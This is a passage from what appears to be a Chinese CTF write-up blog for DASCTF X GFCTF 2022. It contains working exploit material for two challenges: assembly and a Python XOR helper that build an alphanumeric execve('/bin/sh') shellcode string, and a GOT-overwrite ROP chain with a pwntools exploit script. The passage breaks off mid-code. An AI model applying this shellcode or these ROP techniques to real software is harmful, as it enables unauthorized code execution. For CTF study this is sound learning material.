[rax+1],cl</code>来构造出，并写入指定位置。</p><p>可以写出由小于0x7f的指令组成的汇编：功能是把<code>shellcode</code>写到<code>0x10000+0x801</code>处</p><p>(<code>\x00</code>会影响解析汇编，所以微调下位置<code>0x801</code>,push的立即数要反着填)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add ax,0x801<br>push 0x56003148<br>pop rcx<br>xor DWORD PTR [rax], ecx<br>push 0x622f0048<br>pop rcx<br>xor DWORD PTR [rax+0x4], ecx<br>push 0x2f2f6e69<br>pop rcx<br>xor DWORD PTR [rax+0x8], ecx<br>push 0x54576873<br>pop rcx<br>xor DWORD PTR [rax+0xc], ecx<br>push 0x583b6a5f<br>pop rcx<br>xor DWORD PTR [rax+0x10], ecx<br>push 0x050f00<br>pop rcx<br>xor DWORD PTR [rax+0x14], ecx<br>push 0xa<br>pop rcx<br>sub byte [rax+1],cl<br>push 0x41<br>pop rcx<br>sub byte [rax+4],cl<br>push 0x67<br>pop rcx<br>sub byte [rax+19],cl<br>sub ax,0x801<br></code></pre></td></tr></table></figure><h3 id="0x03-异或出小于0x7f">0x03 异或出小于0x7f</h3><p>上面这串汇编对应值为</p><p><code>\x66\x05\x01\x08\x68\x48\x31\x00\x56\x59\x31\x08\x68\x48\x00\x2F\x62\x59\x31\x48\x04\x68\x69\x6E\x2F\x2F\x59\x31\x48\x08\x68\x73\x68\x57\x54\x59\x31\x48\x0C\x68\x5F\x6A\x3B\x58\x59\x31\x48\x10\x68\x00\x0F\x05\x00\x59\x31\x48\x14\x6A\x0A\x59\x28\x48\x02\x6A\x41\x59\x28\x48\x05\x6A\x67\x59\x28\x48\x14\x66\x2D\x01\x08</code></p><p>我们用最初的xor指令来异或出，并写入<code>0x10000+0x400</code>处</p><p>照着官方wp的小程序，来计算一下异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python">table=[<span class="hljs-number">0x31</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x4A</span>,<span class="hljs-number">0x4B</span>,<span class="hljs-number">0x4C</span>,<span class="hljs-number">0x4D</span>,<span class="hljs-number">0x4E</span>,<span class="hljs-number">0x4F</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x5A</span>]<br>table2=&#123;&#125;<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>():   <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> table:<br>            k=i^j<br>            <span class="hljs-keyword">if</span> k <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(table2.keys()):<br>                table2[k]=(i,j)<br>xor()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table2.keys():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i),end=<span class="hljs-string">&#x27;,&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">if</span> n <span class="hljs-keyword">in</span> table2.keys():<br>        <span class="hljs-keyword">return</span> (table2[n])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find1</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table:<br>        j=i^n<br>        <span class="hljs-keyword">if</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(table2.keys()):<br>            <span class="hljs-keyword">return</span>(i,table2[j][<span class="hljs-number">0</span>],table2[j][<span class="hljs-number">1</span>])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor_num</span>(<span class="hljs-params">n</span>):<br>    num1=(n)&amp;<span class="hljs-number">0xff</span><br>    num2=(n&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span><br>    num3=(n&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span><br>    num4=(n&gt;&gt;<span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xff</span><br>    n1=find(num1)<br>    n2=find(num2)<br>    n3=find(num3)<br>    n4=find(num4)<br>    <span class="hljs-keyword">if</span> n1!=<span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> n2!=<span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> n3!=<span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> n4!=<span class="hljs-literal">None</span> :<br>        ret1=n1[<span class="hljs-number">0</span>]+(n2[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">8</span>)+(n3[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">16</span>)+(n4[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">24</span>)<br>        ret2=n1[<span class="hljs-number">1</span>]+(n2[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)+(n3[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">16</span>)+(n4[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">24</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor eax,&quot;</span>+<span class="hljs-built_in">hex</span>(ret1))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor eax,&quot;</span>+<span class="hljs-built_in">hex</span>(ret2))<br>        <span class="hljs-keyword">return</span><br>    num1=(n)&amp;<span class="hljs-number">0xff</span><br>    num2=(n&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span><br>    num3=(n&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span><br>    num4=(n&gt;&gt;<span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xff</span><br>    n1=find1(num1)<br>    n2=find1(num2)<br>    n3=find1(num3)<br>    n4=find1(num4)<br>    <span class="hljs-keyword">if</span> n1!=<span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> n2!=<span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> n3!=<span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> n4!=<span class="hljs-literal">None</span> :<br>        ret1=n1[<span class="hljs-number">0</span>]+(n2[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">8</span>)+(n3[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">16</span>)+(n4[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">24</span>)<br>        ret2=n1[<span class="hljs-number">1</span>]+(n2[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)+(n3[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">16</span>)+(n4[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">24</span>)<br>        ret3=n1[<span class="hljs-number">2</span>]+(n2[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">8</span>)+(n3[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">16</span>)+(n4[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">24</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor eax,&quot;</span>+<span class="hljs-built_in">hex</span>(ret1))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor eax,&quot;</span>+<span class="hljs-built_in">hex</span>(ret2))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor eax,&quot;</span>+<span class="hljs-built_in">hex</span>(ret3))<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;not found&#x27;</span>)<br>xor_num(<span class="hljs-number">0x10440</span>^<span class="hljs-number">0x10000</span>)<br>p2=[<span class="hljs-number">0x66</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x2F</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x2F</span>,<span class="hljs-number">0x2F</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x0C</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x5F</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x3B</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x2D</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x00</span>]<br>a=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(p2),<span class="hljs-number">4</span>):<br>    num=p2[i]+(p2[i+<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)+(p2[i+<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">16</span>)+(p2[i+<span class="hljs-number">3</span>]&lt;&lt;<span class="hljs-number">24</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(num))<br>    xor_num(a^num)<br>    a=num<br><br></code></pre></td></tr></table></figure><p>最后造出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push rdx<br>pop rax<br>xor eax,0x31313131<br>xor eax,0x31313531<br>push rax<br>pop rcx<br>xor eax,0x31423131<br>xor eax,0x31433531<br><br>xor eax,0x41424131<br>xor eax,0x49434457<br>xor DWORD PTR [rcx+0x42], eax<br><br>xor eax,0x31313135<br>xor eax,0x61423161<br>xor eax,0x58434d5a<br>xor DWORD PTR [rcx+0x46], eax<br><br>xor eax,0x31313131<br>xor eax,0x61616141<br>xor eax,0x5850414e<br>xor DWORD PTR [rcx+0x4a], eax<br><br>xor eax,0x31313131<br>xor eax,0x41316141<br>xor eax,0x5731414e<br>xor DWORD PTR [rcx+0x4e], eax<br><br>push rax<br>push rcx<br>pop rax<br>xor eax,0x31313141<br>xor eax,0x31313151<br>push rax<br>pop rcx<br>pop rax<br><br>xor eax,0x31614141<br>xor eax,0x5650504b<br>xor DWORD PTR [rcx+0x42], eax<br><br>xor eax,0x31313161<br>xor eax,0x41313141<br>xor eax,0x56583146<br>xor DWORD PTR [rcx+0x46], eax<br><br>xor eax,0x41313131<br>xor eax,0x44423142<br>xor eax,0x5a434758<br>xor DWORD PTR [rcx+0x4a], eax<br><br>xor eax,0x31313161<br>xor eax,0x31314141<br>xor eax,0x42315747<br>xor DWORD PTR [rcx+0x4e], eax<br><br>push rax<br>push rcx<br>pop rax<br>xor eax,0x31313161<br>xor eax,0x31313151<br>push rax<br>pop rcx<br>pop rax<br><br>xor eax,0x31314131<br>xor eax,0x41414441<br>xor eax,0x5a4c5a50<br>xor DWORD PTR [rcx+0x42], eax<br><br>xor eax,0x31313131<br>xor eax,0x31316131<br>xor eax,0x31584f59<br>xor DWORD PTR [rcx+0x46], eax<br><br>xor eax,0x31313161<br>xor eax,0x42414141<br>xor eax,0x4347524e<br>xor DWORD PTR [rcx+0x4a], eax<br><br>xor eax,0x31614131<br>xor eax,0x31414261<br>xor eax,0x48535856<br>xor DWORD PTR [rcx+0x4e], eax<br><br>push rax<br>push rcx<br>pop rax<br>xor eax,0x31313141<br>xor eax,0x31313151<br>push rax<br>pop rcx<br>pop rax<br><br>xor eax,0x31313131<br>xor eax,0x61313131<br>xor eax,0x45473131<br>xor DWORD PTR [rcx+0x42], eax<br><br>xor eax,0x31313161<br>xor eax,0x31413141<br>xor eax,0x4d4e5948<br>xor DWORD PTR [rcx+0x46], eax<br><br>xor eax,0x41616141<br>xor eax,0x505a5255<br>xor DWORD PTR [rcx+0x4a], eax<br><br>xor eax,0x31313131<br>xor eax,0x41614141<br>xor eax,0x4358524c<br>xor DWORD PTR [rcx+0x4e], eax<br><br>push rax<br>push rcx<br>pop rax<br>xor eax,0x31313131<br>xor eax,0x31313141<br>push rax<br>pop rcx<br>pop rax<br><br>xor eax,0x61614131<br>xor eax,0x434b5058<br>xor DWORD PTR [rcx+0x42], eax<br><br>xor eax,0x31313131<br>xor eax,0x61314131<br>xor eax,0x414f4344<br>xor DWORD PTR [rcx+0x46], eax<br><br>xor eax,0x31613131<br>xor eax,0x41414144<br>xor eax,0x4f535258<br>xor DWORD PTR [rcx+0x4a], eax<br><br>xor eax,0x61313131<br>xor eax,0x41613161<br>xor eax,0x464c4955<br>xor DWORD PTR [rcx+0x4e], eax<br><br>push rcx<br>pop rax<br>xor eax,0x31313531<br>xor eax,0x61616135<br>xor eax,0x50505044<br>push rax<br></code></pre></td></tr></table></figure><p>剩余随便找个填充到0x200，这里找了Y</p><p>shellcode这么一串</p><p><code>RX5111151511PY511B1515C151ABA5WDCI1AB551115a1Ba5ZMCX1AF511115Aaaa5NAPX1AJ511115Aa1A5NA1W1ANPQX5A1115Q111PYX5AAa15KPPV1AB5a1115A11A5F1XV1AF5111A5B1BD5XGCZ1AJ5a1115AA115GW1B1ANPQX5a1115Q111PYX51A115ADAA5PZLZ1AB5111151a115YOX11AF5a1115AAAB5NRGC1AJ51Aa15aBA15VXSH1ANPQX5A1115Q111PYX511115111a511GE1AB5a1115A1A15HYNM1AF5AaaA5URZP1AJ511115AAaA5LRXC1ANPQX511115A111PYX51Aaa5XPKC1AB5111151A1a5DCOA1AF511a15DAAA5XRSO1AJ5111a5a1aA5UILF1ANQX5151155aaa5DPPPPYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</code></p><p>getshell</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/get.png" alt="get"></p><h2 id="R-P">R()P</h2><p>保护没开pie，got表可写</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/%E9%A2%982%E4%BF%9D%E6%8A%A4.png" alt="题2保护"></p><p>题目存在一个栈溢出</p><p>这题是高版本的gcc编译的</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/2.34.png" alt="2.34"></p><p>没了常规的<code>pop rdi;ret</code>   <code>pop_rsi_r15</code>，也没有了csu等gadget用</p><p>主要是如何去rop</p><h3 id="0x01能控制的参数">0x01能控制的参数</h3><p><strong>rax：</strong> 可以由栈上的值控制，gdb调试可得是 rsp+0xc处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040116D                 mov     eax, dword ptr [rsp+18h+buf]<br>.text:0000000000401171                 add     rsp, 18h<br>.text:0000000000401175                 retn<br></code></pre></td></tr></table></figure><p><strong>rdi:</strong></p><p>可以由_bss_start的地址值控制，rax我们可以事先控制为ret的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0000000000401099                 mov     edi, offset __bss_start<br>.text:000000000040109E                 jmp     rax<br></code></pre></td></tr></table></figure><p><strong>rsi：</strong></p><p>可以在要调用read时事先控制好rax，就能控制rsi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040115A                 mov     rsi, rax        ; buf<br>.text:000000000040115D                 mov     edx, dword ptr [rsp+18h+buf] ; nbytes<br>.text:0000000000401161                 xor     edi, edi        ; fd<br>.text:0000000000401163                 mov     eax, 0<br>.text:0000000000401168                 call    _read<br>.text:000000000040116D                 mov     eax, dword ptr [rsp+18h+buf]<br>.text:0000000000401171                 add     rsp, 18h<br>.text:0000000000401175                 retn<br></code></pre></td></tr></table></figure><p><strong>rdx：</strong></p><p>rdx只有在调用read前有一段赋值为栈上的值的操作</p><p>但如果我们要read的话rdx也就是长度不能为0，但是要造的execve的参数只需满足使rdx一个地址指向0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040115D                 mov     edx, dword ptr [rsp+18h+buf] ; nbytes<br></code></pre></td></tr></table></figure><h3 id="0x02-ROP思路">0x02 ROP思路</h3><p>最后我们要rop出<code>execve('/bin/sh',0,0)</code></p><p>参数:</p><p><code>rdi='/bin/sh'</code></p><p><code>rsi=0  or   地址-&gt;0</code></p><p><code>rdx=0 or  地址-&gt;0</code></p><p><strong>ROP链：</strong></p><p>修改rax，改read的rsi为_bss_start，（read的rdx控制为read_got）,</p><p>调用read，写入/bin/sh的同时修改rax为read_got，改read的rsi为read_got，（read的rdx控制为某个地址指向0），</p><p>调用read，改read_got为syscall+0x1b的同时改rdx为某个地址指向0（我本地调syscall前的0x1b破坏了寄存器的值,所以多了0x1b）</p><p>修改rax，控制rdi为/bin/sh</p><p>修改rax为0，控制rsi为0</p><p>现在我们控制了:</p><p><code>read_got=syscall</code></p><p><code>rdi='/bin/sh'</code></p><p><code>rsi=0</code></p><p><code>rdx=地址-&gt;0</code></p><p>调用read即getshell</p><h3 id="0x03-本地exp">0x03 本地exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib64/ld-linux-x86-64.so.2&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    <span class="hljs-comment">#r = process(local_file)</span><br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = elf.arch</span><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    bss_start=<span class="hljs-number">0x404018</span><br><br>    ret=<span class="hljs-number">0x40101a</span><br>    rax=<span class="hljs-number">0x40116d</span><br>    rsi_call_read=<span class="hljs-number">0x401141</span><br>    rdi=<span class="hljs-number">0x401099</span><br>    read_rax=<span class="hljs-number">0x40115a</span><br>    <br>    se(p32(<span class="hljs-number">0x100</span>))<br>    payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bss_start)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(read_rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(read_got)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(read_rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bss_start+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(ret)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(rdi)<br>    payload+=p64(rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0x3b</span>)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(rsi_call_read)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)<br>    se(payload)<br>    se(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>    se(<span class="hljs-string">b&#x27;\x3b\x1a\xea&#x27;</span>)<br>    r.recv(timeout = <span class="hljs-number">1</span>)<br>    r.interactive()<br><span 